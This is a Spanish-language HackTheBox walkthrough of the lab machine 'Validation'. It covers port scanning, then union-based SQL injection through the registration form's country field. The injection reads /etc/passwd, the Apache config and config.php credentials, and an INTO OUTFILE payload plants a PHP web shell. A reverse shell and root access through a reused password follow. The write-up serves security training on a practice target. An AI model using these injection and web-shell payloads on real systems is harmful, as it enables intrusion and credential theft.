---
title: Validation - HTB
date: 2026-04-25
mermaid: true
categories: [HackTheBox, Linux, Easy]
image: 
  path: /assets/images/htb/validation/logo.png
tags: [SQLi Union Based, SQL, Second Order]
---

---

## Enumeration

Vamos a empezar con un escaneo `nmap`:

```bash
[Apr 07, 2026 - 20:34:40 (CEST)] exegol-htb Validation # nmap -p- --open -sS -n -Pn -vvv 10.129.17.24             
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-07 20:34 CEST
Initiating SYN Stealth Scan at 20:34
Scanning 10.129.17.24 [65535 ports]
Discovered open port 8080/tcp on 10.129.17.24
Discovered open port 22/tcp on 10.129.17.24
Discovered open port 80/tcp on 10.129.17.24
Discovered open port 4566/tcp on 10.129.17.24
Completed SYN Stealth Scan at 20:35, 17.38s elapsed (65535 total ports)
Nmap scan report for 10.129.17.24
Host is up, received user-set (0.044s latency).
Scanned at 2026-04-07 20:34:42 CEST for 18s
Not shown: 65378 closed tcp ports (reset), 153 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 62
4566/tcp open  kwtc       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds
           Raw packets sent: 65853 (2.898MB) | Rcvd: 65489 (2.620MB)
```

Vamos a realizar un segundo escaneo para obtener más información sobre los puertos:

```bash
[Apr 07, 2026 - 20:36:07 (CEST)] exegol-htb Validation # nmap -p22,80,4566,8080 -sCV 10.129.17.24                          
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-07 20:36 CEST
Nmap scan report for 10.129.17.24
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8f5efd2d3f98dadc6cf24859426ef7a (RSA)
|   256 463d6bcba819eb6ad06886948673e172 (ECDSA)
|_  256 7032d7e377c14acf472adee5087af87a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.67 seconds
```

| PORT       | DESCRIPTION         |
| ---------- | ------------------- |
| `22/TCP`   | OpenSSH 8.2p1       |
| `80/TCP`   | Apache httpd 2.4.48 |
| `4566/TCP` | Nginx               |
| `8080/TCP` | Nginx               |

### Website - TCP 80

Vamos a visitar la aplicación web:

![](/assets/images/htb/validation/1.png)

Vemos que podemos registrarnos, vamos a probar:

![](/assets/images/htb/validation/2.png)

Vamos a ver que petición se tramita por atrás:

![](/assets/images/htb/validation/3.png)

Vemos que se tramita por el método `POST`, vamos a probar a añadir una `'` para ver si esto se está tramitando por alguna consulta y no está bien configurada:

- `username`

![](/assets/images/htb/validation/4.png)

Un detalle que podemos ver es el siguiente, nuestro `input` podemos verlo reflejado en `account.php`:

![](/assets/images/htb/validation/5.png)

Otro input que se está viendo es el país, vamos a probar a añadirle una `'`:

- `country`:

![](/assets/images/htb/validation/6.png)

Vamos a ver en `account.php`:

![](/assets/images/htb/validation/7.png)

Vemos un error, donde nos esta comentando un error con la función `fetch_assoc()` que si buscamos:

![](/assets/images/htb/validation/8.png)

Vemos que estamos ocasionando un fallo en la base de datos. Vamos a probar un `UNION based`.

## SQL Injection Union Based
Vamos a intentar enumerar el número de columnas existentes en la tabla en uso:

- Payload:

```sql
'ORDER+BY+1--+-
```

![](/assets/images/htb/validation/9.png)

Vamos a probar `5`:

- Payload:

```sql
'ORDER+BY+5--+-
```

![](/assets/images/htb/validation/10.png)

Vemos que con `5` columnas se queja, vamos a probar `4`:

![](/assets/images/htb/validation/11.png)

Vamos a probar `3`:

![](/assets/images/htb/validation/12.png)

Vamos a probar con `2`:

![](/assets/images/htb/validation/22.png)

Vale, la tabla que se esta empleando solo tiene 1 columna. Así que a futuro si queremos reflejar varios valores podemos usar `group_concat` o `concat` para concatenar resultados.

## Shell as www-data

Sabiendo que nuestro input se refleja vamos a intentar leer un archivo interno del sistema:

Para ello usaremos la función `LOAD_FILE()`:

```sql
'UNION SELECT LOAD_FILE('/etc/passwd')--+-
```

![](/assets/images/htb/validation/13.png)

Podemos leer archivos arbitrarios del sistema, vamos a ver base de datos está empleando y su versión:

```sql
'UNION SELECT @@version--+-
```

![](/assets/images/htb/validation/14.png)

Estamos ante una base de datos `MariaDB`, vamos a enumerar que usuario se está empleando:

```sql
'UNION SELECT user()--+-
```

![](/assets/images/htb/validation/15.png)

Vemos el usuario `uhc`, si vemos el `/etc/passwd` no existe en el sistema ningún usuario solo `root`. Vamos a intentar leer el código fuente, en este caso la aplicación está empleando PHP.

Antes de intentar cualquier cosa tenemos que intentar ver el archivo de configuración de Apache:


```sql
'UNION SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')--+-
```

![](/assets/images/htb/validation/16.png)

Vemos que existe el archivo predeterminado de configuración de Apache. 

En este caso vemos que está empleando la ruta `/var/www/html` la predeterminada en estos casos. Vamos a intentar leer el archivo `index.php` para ver si se encuentra en esa ubicación:

```sql
'UNION SELECT LOAD_FILE('/var/www/html/index.php')--+-
```

![](/assets/images/htb/validation/17.png)

Bien, tenemos el código fuente de `index.php`:

```php
<?php
require('config.php');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $userhash = md5($_POST['username']);

    $sql = "INSERT INTO registration (username, userhash, country, regtime)
            VALUES (?, ?, ?, ?)";

    $stmt = $conn->prepare($sql);
    $stmt->bind_param(
        "sssi",
        $_POST['username'],
        $userhash,
        $_POST['country'],
        time()
    );

    if ($stmt->execute()) {
        setcookie('user', $userhash);
        header("Location: /account.php");
        exit;
    }

    $sql = "UPDATE registration SET country = ? WHERE username = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $_POST['country'], $_POST['username']);
    $stmt->execute();

    setcookie('user', $userhash);
    header("Location: /account.php");
    exit;
}
?>

<link href="css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.min.js"></script>

<!------ Include the above in your HEAD tag ---------->

<div>
    <div class="container">
        <h1 class="text-center m-5">
            Join the UHC - September Qualifiers
        </h1>
    </div>

    <section class="bg-dark text-center p-5 mt-4">
        <div class="container p-3">
            <h3 class="text-white">Register Now</h3>

            <form action="#" method="POST">
                <input type="text" name="username" placeholder="Username">

                <select id="country" name="country">
                    <option value="Brazil">Brazil</option>
                    <option value="Afganistan">Afghanistan</option>
                    <option value="Albania">Albania</option>
                    <option value="Algeria">Algeria</option>
                    <option value="American Samoa">American Samoa</option>
                    <option value="Andorra">Andorra</option>
                    <option value="Angola">Angola</option>
                    <option value="Anguilla">Anguilla</option>
                    <option value="Antigua & Barbuda">Antigua & Barbuda</option>
                    <option value="Argentina">Argentina</option>
					[...]
                </select>

                <button type="submit" class="btn btn-default">
                    Join Now <i class="fa fa-envelope"></i>
                </button>
            </form>
        </div>
    </section>
</div>
```

No vemos nada interesante que nos pueda servir, vamos a realizar fuzzing para ver otros archivos:
```bash
[Apr 10, 2026 - 19:31:05 (CEST)] exegol-htb Validation # ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -u "http://validation.htb/FUZZ" -e .php -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://validation.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

account.php             [Status: 200, Size: 16, Words: 2, Lines: 1, Duration: 45ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 44ms]
                        [Status: 200, Size: 16088, Words: 4698, Lines: 269, Duration: 4503ms]
index.php               [Status: 200, Size: 16088, Words: 4698, Lines: 269, Duration: 4509ms]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 44ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 46ms]
```

Vamos a leer el archivo `config.php`:
```sql
'UNION SELECT LOAD_FILE('/var/www/html/config.php')--+-
```

![](/assets/images/htb/validation/18.png)

Obtenemos las credenciales del usuario de la base de datos. Pero no nos sirve para mucho actualmente... 

Vamos a intentar escribir en el sistema usando la función `INTO OUTFILE`:

- Payload:

```sql
'UNION SELECT 'test' INTO OUTFILE '/var/www/html/test'--+-
```

![](/assets/images/htb/validation/19.png)

Vamos a probar si existe el archivo:

![](/assets/images/htb/validation/20.png)

Bien, vamos a crear una web shell:

```sql
'UNION SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/cmd.php'--+-
```

![](/assets/images/htb/validation/21.png)

```bash
[Apr 10, 2026 - 19:36:07 (CEST)] exegol-htb Validation # curl -s "http://validation.htb/cmd.php?0=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Vamos a darnos reverse shell:
```bash
[Apr 10, 2026 - 19:38:11 (CEST)] exegol-htb Validation # nc -nvlp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.95.235.
Ncat: Connection from 10.129.95.235:41224.
Linux validation 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 GNU/Linux
 17:38:16 up 51 min,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/$ 
```

## Shell as root

Vamos a probar las credenciales obtenidas anteriormente para ver si hay reutilización de ellas:
```bash
www-data@validation:/$ su
Password: 
root@validation:/#
```

---